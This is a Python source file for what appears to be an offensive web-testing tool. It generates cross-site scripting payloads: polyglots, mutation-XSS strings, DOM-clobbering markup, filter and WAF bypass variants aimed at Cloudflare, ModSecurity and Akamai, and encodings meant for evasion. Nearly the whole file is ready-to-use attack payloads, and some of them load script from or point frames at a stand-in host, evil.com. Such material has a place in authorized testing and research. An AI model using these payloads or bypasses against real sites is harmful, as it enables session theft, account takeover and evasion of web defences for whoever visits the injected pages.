"""
Polyglot Generator & Advanced XSS Detection
=============================================
Generates context-breaking payloads that work across multiple contexts.
Includes DOM-based XSS detection, mXSS payloads, and advanced evasion.

Based on research from:
- PortSwigger XSS research
- Gareth Heyes polyglots
- Masato Kinugawa mXSS research
- LiveOverflow browser exploitation
"""

import base64
import random
import re
import string
from dataclasses import dataclass
from enum import Enum, auto
from typing import Dict, List


class XSSContext(Enum):
    """XSS injection contexts"""
    HTML_TEXT = auto()
    HTML_ATTR_DOUBLE = auto()
    HTML_ATTR_SINGLE = auto()
    HTML_ATTR_UNQUOTED = auto()
    SCRIPT_STRING_DOUBLE = auto()
    SCRIPT_STRING_SINGLE = auto()
    SCRIPT_TEMPLATE = auto()
    SCRIPT_BLOCK = auto()
    SCRIPT_REGEX = auto()
    URL_HREF = auto()
    URL_SRC = auto()
    CSS_VALUE = auto()
    CSS_URL = auto()
    SVG_CONTEXT = auto()
    MATHML_CONTEXT = auto()
    XML_CONTEXT = auto()
    JSON_VALUE = auto()
    UNKNOWN = auto()


@dataclass
class XSSPayload:
    """Represents an XSS payload with metadata"""
    payload: str
    contexts: List[XSSContext]
    description: str
    bypasses: List[str]  # What filters it bypasses
    confidence: str  # How likely to work
    requires_interaction: bool = False
    is_polyglot: bool = False


class PolyglotGenerator:
    """
    Generates polyglot XSS payloads that work across multiple contexts.
    """

    # ==================== CONTEXT BREAKERS ====================

    # Break out of HTML attributes
    ATTR_BREAKERS = {
        'double': [
            '"',
            '">',
            '" ',
            '"%20',
            '"///',
            '"><',
        ],
        'single': [
            "'",
            "'>",
            "' ",
            "'%20",
            "'///",
            "'><",
        ],
        'unquoted': [
            ' ',
            '>',
            '//',
            '%20',
            '%0a',
            '%09',
        ],
    }

    # Break out of JavaScript strings
    JS_BREAKERS = {
        'double': [
            '"',
            '";',
            '"-',
            '"+',
            '")',
            '"\\',
        ],
        'single': [
            "'",
            "';",
            "'-",
            "'+",
            "')",
            "'\\",
        ],
        'template': [
            '`',
            '${',
            '`-',
            '`+',
        ],
    }

    # ==================== EVENT HANDLERS ====================

    # Comprehensive event handlers list (2024 updated)
    EVENT_HANDLERS = [
        # Mouse events
        'onclick', 'ondblclick', 'onmousedown', 'onmouseup', 'onmouseover',
        'onmouseout', 'onmousemove', 'onmouseenter', 'onmouseleave',
        'oncontextmenu', 'onwheel',

        # Keyboard events
        'onkeydown', 'onkeyup', 'onkeypress',

        # Focus events
        'onfocus', 'onblur', 'onfocusin', 'onfocusout',

        # Form events
        'onsubmit', 'onreset', 'onchange', 'oninput', 'oninvalid', 'onselect',

        # Resource events
        'onload', 'onerror', 'onabort', 'onloadstart', 'onloadend',
        'onprogress', 'ontimeout',

        # Animation events
        'onanimationstart', 'onanimationend', 'onanimationiteration',
        'ontransitionend', 'ontransitionrun', 'ontransitionstart',

        # Drag events
        'ondrag', 'ondragstart', 'ondragend', 'ondragenter', 'ondragleave',
        'ondragover', 'ondrop',

        # Clipboard events
        'oncopy', 'oncut', 'onpaste',

        # Touch events (mobile)
        'ontouchstart', 'ontouchend', 'ontouchmove', 'ontouchcancel',

        # Pointer events
        'onpointerdown', 'onpointerup', 'onpointermove', 'onpointerover',
        'onpointerout', 'onpointerenter', 'onpointerleave', 'onpointercancel',
        'ongotpointercapture', 'onlostpointercapture',

        # Media events
        'onplay', 'onpause', 'onended', 'onvolumechange', 'onseeking',
        'onseeked', 'ontimeupdate', 'oncanplay', 'oncanplaythrough',

        # Misc events
        'onscroll', 'onresize', 'onhashchange', 'onpopstate',
        'onstorage', 'onmessage', 'ononline', 'onoffline',
        'onbeforeprint', 'onafterprint', 'onbeforeunload', 'onunload',
        'onauxclick', 'onshow', 'ontoggle', 'onsearch', 'onwebkitanimationend',
    ]

    # Event handlers that don't require user interaction
    AUTO_TRIGGER_EVENTS = [
        'onload', 'onerror', 'onanimationstart', 'onanimationend',
        'onfocus', 'onblur', 'onhashchange', 'onpageshow',
        'ontransitionend', 'onbegin', 'onend',
    ]

    # ==================== HTML TAGS ====================

    # Tags that commonly allow event handlers
    EVENT_TAGS = [
        'img', 'svg', 'body', 'input', 'video', 'audio', 'iframe',
        'marquee', 'object', 'embed', 'details', 'math', 'animate',
        'a', 'area', 'button', 'form', 'select', 'textarea',
        'style', 'link', 'script', 'isindex', 'image', 'keygen',
    ]

    # Tags that support onload/onerror
    RESOURCE_TAGS = [
        ('img', 'src', 'x'),
        ('svg', None, None),
        ('video', 'src', 'x'),
        ('audio', 'src', 'x'),
        ('iframe', 'src', 'javascript:alert(1)'),
        ('object', 'data', 'x'),
        ('embed', 'src', 'x'),
        ('link', 'href', 'x'),
        ('script', 'src', 'x'),
        ('input', 'type', 'image'),
        ('body', 'background', 'x'),
    ]

    # ==================== JAVASCRIPT EXECUTION SINKS ====================

    JS_EXECUTION_METHODS = [
        'alert({payload})',
        'confirm({payload})',
        'prompt({payload})',
        'console.log({payload})',
        'eval({payload})',
        'Function({payload})()',
        'setTimeout({payload})',
        'setInterval({payload})',
        'new Function({payload})()',
        '[].constructor.constructor({payload})()',
        'Reflect.construct(Function,[{payload}])()',
    ]

    # ==================== POLYGLOT TEMPLATES ====================

    POLYGLOT_TEMPLATES = [
        # Ultimate polyglot (Gareth Heyes)
        XSSPayload(
            payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            contexts=[XSSContext.HTML_TEXT, XSSContext.HTML_ATTR_DOUBLE, XSSContext.HTML_ATTR_SINGLE,
                     XSSContext.SCRIPT_STRING_DOUBLE, XSSContext.SCRIPT_STRING_SINGLE, XSSContext.URL_HREF],
            description="Ultimate XSS polyglot by Gareth Heyes",
            bypasses=['basic_filter', 'tag_filter', 'event_filter'],
            confidence='high',
            is_polyglot=True
        ),

        # Multi-context escape
        XSSPayload(
            payload="'\"><script>alert(1)</script><img src=x onerror=alert(1)//>",
            contexts=[XSSContext.HTML_TEXT, XSSContext.HTML_ATTR_DOUBLE, XSSContext.HTML_ATTR_SINGLE],
            description="Multi-context attribute escape with script and img",
            bypasses=['basic_filter'],
            confidence='high',
            is_polyglot=True
        ),

        # mXSS polyglot (Masato Kinugawa)
        XSSPayload(
            payload="<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            contexts=[XSSContext.HTML_TEXT],
            description="Mutation XSS via noscript parsing",
            bypasses=['sanitizer', 'dompurify_old'],
            confidence='medium',
            is_polyglot=True
        ),

        # Template injection + XSS
        XSSPayload(
            payload="{{constructor.constructor('alert(1)')()}}<img src=x onerror=alert(1)>",
            contexts=[XSSContext.HTML_TEXT],
            description="Angular/Template + XSS polyglot",
            bypasses=['angular_sandbox'],
            confidence='medium',
            is_polyglot=True
        ),

        # SVG/XML polyglot
        XSSPayload(
            payload="<svg><![CDATA[><script>alert(1)</script>]]>",
            contexts=[XSSContext.SVG_CONTEXT, XSSContext.XML_CONTEXT],
            description="SVG CDATA XSS",
            bypasses=['html_parser'],
            confidence='medium',
            is_polyglot=True
        ),

        # CSS + HTML polyglot
        XSSPayload(
            payload="</style><script>alert(1)</script><style>",
            contexts=[XSSContext.CSS_VALUE, XSSContext.HTML_TEXT],
            description="Break out of style tag",
            bypasses=['css_filter'],
            confidence='high',
            is_polyglot=True
        ),
    ]

    # ==================== MXSS PAYLOADS ====================

    MXSS_PAYLOADS = [
        # noscript mutation
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",

        # style/title mutation
        "<style><style/><script>alert(1)</script>",

        # SVG/foreignObject mutation
        "<svg><foreignObject><p><style></style><script>alert(1)</script></p></foreignObject></svg>",

        # math mutation
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",

        # Nested form mutation
        "<form><math><mtext></form><form><mglyph><svg><script>alert(1)</script>",

        # xmp mutation
        "<xmp><p title=\"</xmp><img src=x onerror=alert(1)>\">",

        # listing mutation
        "<listing><p title=\"</listing><img src=x onerror=alert(1)>\">",

        # Attribute mutation (Chrome)
        "<p id=\"<img src=x onerror=alert(1)//\">",
    ]

    # ==================== DOM CLOBBERING PAYLOADS ====================

    DOM_CLOBBERING_PAYLOADS = [
        # Clobber location
        {
            'payload': '<img name="location" src="//evil.com/redirect.js">',
            'target': 'location',
            'effect': 'DOM location can be clobbered to redirect',
        },
        # Clobber form elements
        {
            'payload': '<form id="x"><input id="y"></form>',
            'target': 'document.x.y',
            'effect': 'Creates form/input hierarchy accessible via DOM',
        },
        # Clobber with anchor chain
        {
            'payload': '<a id="x"><a id="x" name="y" href="data:,payload">',
            'target': 'x.y',
            'effect': 'Creates x.y reference pointing to data URL',
        },
        # Clobber document.domain
        {
            'payload': '<img name="domain" src="x">',
            'target': 'document.domain',
            'effect': 'May interfere with domain checks',
        },
        # Clobber cookie
        {
            'payload': '<img id="cookie" src="x">',
            'target': 'document.cookie',
            'effect': 'May interfere with cookie access',
        },
        # Clobber with iframe name
        {
            'payload': '<iframe name="location" src="//evil.com"></iframe>',
            'target': 'window.location',
            'effect': 'Frame name clobbers window property',
        },
        # Clobber with object
        {
            'payload': '<object id="x"><object name="y" data="//evil.com"></object></object>',
            'target': 'x.y',
            'effect': 'Nested objects create property chain',
        },
        # Clobber defaultView
        {
            'payload': '<img name="defaultView" src="x">',
            'target': 'document.defaultView',
            'effect': 'Interferes with window reference',
        },
    ]

    def __init__(self):
        self.canary = self._generate_canary()

    def _generate_canary(self) -> str:
        """Generate unique canary for XSS detection"""
        return f"xss{''.join(random.choices(string.ascii_lowercase, k=6))}"

    # ==================== PAYLOAD GENERATION ====================

    def generate_basic_payloads(self, context: XSSContext = XSSContext.HTML_TEXT) -> List[str]:
        """Generate basic XSS payloads for a specific context"""
        payloads = []

        if context == XSSContext.HTML_TEXT:
            # Script tag based
            payloads.extend([
                '<script>alert(1)</script>',
                '<script src=//evil.com></script>',
                '<script>alert`1`</script>',
            ])

            # Event handler based
            for tag, attr, value in self.RESOURCE_TAGS:
                if attr:
                    payloads.append(f'<{tag} {attr}={value} onerror=alert(1)>')
                else:
                    payloads.append(f'<{tag} onload=alert(1)>')

            # SVG based
            payloads.extend([
                '<svg/onload=alert(1)>',
                '<svg><script>alert(1)</script></svg>',
                '<svg><animate onbegin=alert(1)>',
            ])

        elif context in [XSSContext.HTML_ATTR_DOUBLE, XSSContext.HTML_ATTR_SINGLE]:
            quote = '"' if context == XSSContext.HTML_ATTR_DOUBLE else "'"

            # Break out and add event
            payloads.extend([
                f'{quote} onmouseover=alert(1) x={quote}',
                f'{quote} onfocus=alert(1) autofocus x={quote}',
                f'{quote}><script>alert(1)</script>',
                f'{quote}><img src=x onerror=alert(1)>',
                f'{quote} onclick=alert(1)//',
            ])

        elif context == XSSContext.HTML_ATTR_UNQUOTED:
            payloads.extend([
                ' onmouseover=alert(1) ',
                ' onfocus=alert(1) autofocus ',
                '><script>alert(1)</script>',
                '><img src=x onerror=alert(1)>',
            ])

        elif context in [XSSContext.SCRIPT_STRING_DOUBLE, XSSContext.SCRIPT_STRING_SINGLE]:
            quote = '"' if context == XSSContext.SCRIPT_STRING_DOUBLE else "'"

            payloads.extend([
                f'{quote}-alert(1)-{quote}',
                f'{quote};alert(1);//',
                f'{quote}+alert(1)+{quote}',
                '</script><script>alert(1)</script>',
            ])

        elif context == XSSContext.SCRIPT_TEMPLATE:
            payloads.extend([
                '${alert(1)}',
                '`-alert(1)-`',
                '${constructor.constructor("alert(1)")()}',
            ])

        elif context in [XSSContext.URL_HREF, XSSContext.URL_SRC]:
            payloads.extend([
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'javascript:alert(1)//http://',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            ])

        return payloads

    def generate_filter_bypass_payloads(self, blocked_patterns: List[str] = None) -> List[str]:
        """Generate payloads that bypass common filters"""
        payloads = []
        blocked = set(p.lower() for p in (blocked_patterns or []))

        # If <script> is blocked
        if 'script' in blocked or '<script' in blocked:
            payloads.extend([
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<marquee onstart=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
            ])

        # If alert is blocked
        if 'alert' in blocked:
            payloads.extend([
                '<img src=x onerror=confirm(1)>',
                '<img src=x onerror=prompt(1)>',
                '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
                '<img src=x onerror=[].constructor.constructor("alert(1)")()>',
                '<img src=x onerror=top["al"+"ert"](1)>',
                '<img src=x onerror=self["\\x61lert"](1)>',
            ])

        # If on* is blocked
        if 'on' in blocked or any('on' in p for p in blocked):
            payloads.extend([
                '<a href="javascript:alert(1)">click</a>',
                '<form action="javascript:alert(1)"><input type=submit>',
                '<object data="javascript:alert(1)">',
                '<embed src="javascript:alert(1)">',
                '<iframe src="javascript:alert(1)">',
            ])

        # If () is blocked
        if '(' in blocked or ')' in blocked:
            payloads.extend([
                '<img src=x onerror=alert`1`>',
                '<svg/onload=alert&lpar;1&rpar;>',
                '<img src=x onerror=location="javascript:alert%281%29">',
            ])

        # Case variations
        payloads.extend([
            '<ScRiPt>alert(1)</sCrIpT>',
            '<IMG SRC=x ONERROR=alert(1)>',
            '<svg/ONLOAD=alert(1)>',
        ])

        # Null byte and whitespace
        payloads.extend([
            '<scr%00ipt>alert(1)</scr%00ipt>',
            '<img%09src=x%09onerror=alert(1)>',
            '<img%0asrc=x%0aonerror=alert(1)>',
            '<img%0dsrc=x%0donerror=alert(1)>',
        ])

        return payloads

    def generate_waf_bypass_payloads(self, waf_type: str = None) -> List[str]:
        """Generate WAF-specific bypass payloads"""
        payloads = []

        # Universal bypasses
        universal = [
            # Unicode normalization
            '<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>',
            # HTML entities
            '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
            # Hex entities
            '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>',
            # Tab/newline within event
            '<img src=x onerror="al\tert(1)">',
            '<img src=x onerror="al\nert(1)">',
            # Double encoding
            '%253Cscript%253Ealert(1)%253C/script%253E',
            # JSFuck style
            '<img src=x onerror=[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]>',
        ]
        payloads.extend(universal)

        if waf_type == 'cloudflare':
            payloads.extend([
                '<img/src="x"/onerror=alert(1)//>',
                '<svg/onload=self["al"+"ert"](1)>',
                '<div/onmouseover="alert`1`">hover</div>',
            ])

        elif waf_type == 'modsecurity':
            payloads.extend([
                '<!--><svg/onload=alert(1)//-->',
                '<x/onclick=alert(1)>click',
                '<isindex type=submit action="javascript:alert(1)">',
            ])

        elif waf_type == 'akamai':
            payloads.extend([
                '<video/poster/onerror=alert(1)//',
                '<input type=image src=x onerror=alert(1)>',
            ])

        return payloads

    def generate_polyglots(self, max_length: int = None) -> List[XSSPayload]:
        """Generate polyglot payloads"""
        polyglots = list(self.POLYGLOT_TEMPLATES)

        if max_length:
            polyglots = [p for p in polyglots if len(p.payload) <= max_length]

        return polyglots

    def generate_mxss_payloads(self) -> List[str]:
        """Generate mutation XSS payloads"""
        return list(self.MXSS_PAYLOADS)

    def generate_dom_clobbering_payloads(self) -> List[Dict]:
        """Generate DOM clobbering payloads"""
        return list(self.DOM_CLOBBERING_PAYLOADS)

    # ==================== CONTEXT DETECTION ====================

    def detect_context(self, response: str, canary: str) -> List[XSSContext]:
        """Detect where the canary is reflected"""
        contexts = []

        if canary not in response:
            return [XSSContext.UNKNOWN]

        # Check various contexts
        patterns = [
            (rf'<[^>]*{re.escape(canary)}[^>]*>', XSSContext.HTML_TEXT),
            (rf'="[^"]*{re.escape(canary)}[^"]*"', XSSContext.HTML_ATTR_DOUBLE),
            (rf"='[^']*{re.escape(canary)}[^']*'", XSSContext.HTML_ATTR_SINGLE),
            (rf'=[^"\'\s>]*{re.escape(canary)}', XSSContext.HTML_ATTR_UNQUOTED),
            (rf'<script[^>]*>[^<]*"[^"]*{re.escape(canary)}', XSSContext.SCRIPT_STRING_DOUBLE),
            (rf"<script[^>]*>[^<]*'[^']*{re.escape(canary)}", XSSContext.SCRIPT_STRING_SINGLE),
            (rf'<script[^>]*>[^<]*`[^`]*{re.escape(canary)}', XSSContext.SCRIPT_TEMPLATE),
            (rf'<svg[^>]*>.*{re.escape(canary)}', XSSContext.SVG_CONTEXT),
            (rf'href=["\']?[^"\']*{re.escape(canary)}', XSSContext.URL_HREF),
            (rf'src=["\']?[^"\']*{re.escape(canary)}', XSSContext.URL_SRC),
            (rf'<style[^>]*>[^<]*{re.escape(canary)}', XSSContext.CSS_VALUE),
        ]

        for pattern, context in patterns:
            if re.search(pattern, response, re.IGNORECASE | re.DOTALL):
                contexts.append(context)

        # If reflected but no specific context matched
        if not contexts:
            contexts.append(XSSContext.HTML_TEXT)

        return contexts

    def get_payloads_for_context(self, contexts: List[XSSContext],
                                  include_polyglots: bool = True) -> List[str]:
        """Get appropriate payloads for detected contexts"""
        payloads = []

        for context in contexts:
            payloads.extend(self.generate_basic_payloads(context))

        if include_polyglots:
            for poly in self.generate_polyglots():
                if any(c in poly.contexts for c in contexts):
                    payloads.append(poly.payload)

        return list(set(payloads))

    # ==================== PAYLOAD ENCODING ====================

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload for filter bypass"""
        encodings = {
            'html_dec': lambda s: ''.join(f'&#{ord(c)};' for c in s),
            'html_hex': lambda s: ''.join(f'&#x{ord(c):x};' for c in s),
            'url': lambda s: ''.join(f'%{ord(c):02x}' for c in s),
            'double_url': lambda s: ''.join(f'%25{ord(c):02x}' for c in s),
            'unicode': lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),
            'base64': lambda s: base64.b64encode(s.encode()).decode(),
            'hex': lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),
        }

        return encodings.get(encoding, lambda s: s)(payload)

    def generate_all_encodings(self, payload: str) -> Dict[str, str]:
        """Generate all encodings of a payload"""
        encodings = ['html_dec', 'html_hex', 'url', 'double_url', 'unicode', 'base64', 'hex']
        return {enc: self.encode_payload(payload, enc) for enc in encodings}


class DOMClobberingDetector:
    """
    Detect DOM clobbering vulnerabilities.
    """

    # Common clobbering targets
    SENSITIVE_PROPERTIES = [
        'location', 'cookie', 'domain', 'referrer', 'URL',
        'documentURI', 'baseURI', 'defaultView', 'body',
        'head', 'forms', 'images', 'links', 'scripts',
        'styleSheets', 'anchors', 'applets', 'embeds',
    ]

    def __init__(self):
        self.generator = PolyglotGenerator()

    def get_detection_payloads(self, target_property: str = None) -> List[Dict]:
        """Get payloads to test for DOM clobbering"""
        payloads = self.generator.generate_dom_clobbering_payloads()

        if target_property:
            payloads = [p for p in payloads if target_property.lower() in p['target'].lower()]

        return payloads

    def generate_exploit_payload(self, target: str, value: str) -> str:
        """Generate payload to clobber a specific property with a value"""
        # ID clobbering
        if '.' not in target:
            return f'<img id="{target}" src="{value}">'

        # Property chain clobbering
        parts = target.split('.')
        if len(parts) == 2:
            return f'<a id="{parts[0]}"><a id="{parts[0]}" name="{parts[1]}" href="{value}">'

        return ''


# Convenience functions
def get_xss_payloads(context: XSSContext = XSSContext.HTML_TEXT,
                     include_bypass: bool = True,
                     waf: str = None) -> List[str]:
    """
    Convenience function to get XSS payloads.

    Args:
        context: Injection context
        include_bypass: Include filter bypass payloads
        waf: Target WAF for specific bypasses

    Returns:
        List of payloads
    """
    generator = PolyglotGenerator()
    payloads = generator.generate_basic_payloads(context)

    if include_bypass:
        payloads.extend(generator.generate_filter_bypass_payloads())

    if waf:
        payloads.extend(generator.generate_waf_bypass_payloads(waf))

    # Add polyglots
    for poly in generator.generate_polyglots():
        if context in poly.contexts:
            payloads.append(poly.payload)

    return list(set(payloads))


def get_mxss_payloads() -> List[str]:
    """Get mutation XSS payloads"""
    return PolyglotGenerator().generate_mxss_payloads()


def get_dom_clobbering_payloads() -> List[Dict]:
    """Get DOM clobbering payloads"""
    return PolyglotGenerator().generate_dom_clobbering_payloads()
